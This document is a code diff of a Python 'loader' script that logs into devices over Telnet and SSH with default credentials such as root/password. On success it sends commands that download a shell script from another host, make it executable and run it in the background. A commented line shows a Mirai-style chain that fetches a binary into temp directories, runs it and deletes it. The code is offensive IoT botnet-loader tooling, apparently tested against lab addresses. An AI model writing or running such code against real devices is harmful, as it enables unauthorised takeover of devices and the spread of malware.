@@ -2,6 +2,7 @@ import telnetlib
 import sys
 import os
 import json
+import time
 from libs import truecolors
 import paramiko
 Host_IP = ""
@@ -48,8 +49,18 @@ def doTelnetLogin(ip, port, user, pass_):
                     print("[loader] Login succeeded %s " % ip +" --> "+ ' : '.join((user, password)))
                     response = tn.read_until(b"#", 1)
                     #tn.write(("cd /tmp; cd/var/run; cd /mnt; cd/root; wget %s; chmod +x %s; ./%s; rm -rf %s;" % (__bin__,os.path.basename(__bin__), os.path.basename(__bin__), os.path.basename(__bin__)) + "\n").encode('ascii'))
-                    tn.write("wget http://140.123.97.150/test\n".encode('ascii'))  # 使用指令查看   
-                    print("Exec command "+"wget http://140.123.97.150/test\n" +"--> Successful")                
+                    cmd="wget http://192.168.1.97:31338/wget_download_exec.sh"
+                    cmd1="chmod +x wget_download_exec.sh"
+                    cmd2="./wget_download_exec.sh"
+                    tn.write((cmd+"\n").encode('ascii'))  
+                    response = tn.read_until(b"#", 1)
+                    print(str(response))
+                    tn.write((cmd1+"\n").encode('ascii'))  
+                    response = tn.read_until(b"#", 1)
+                    print(str(response))
+                    tn.write((cmd2+" & \n").encode('ascii'))  
+                    response = tn.read_until(b"#", 1)
+                    print("Exec command "+cmd +"--> Successful")                
                     print("[loader] This device is broken.")
                     return
         except EOFError as e:
@@ -99,8 +110,8 @@ def ForceDB(fname):
 
 
 if __name__ == '__main__':
-    Host_IP, targerIP = read_config_ip()
+    #Host_IP, targerIP = read_config_ip()
     #ForceDB(sys.argv[2])
-    doTelnetLogin("192.168.1.167", "23", "admin", "password")
-    doSSHLogin("192.168.1.167","22","admin","password")
+    doTelnetLogin("192.168.1.121", "23", "root", "password")
+    #doSSHLogin("192.168.1.167","22","admin","password")
     
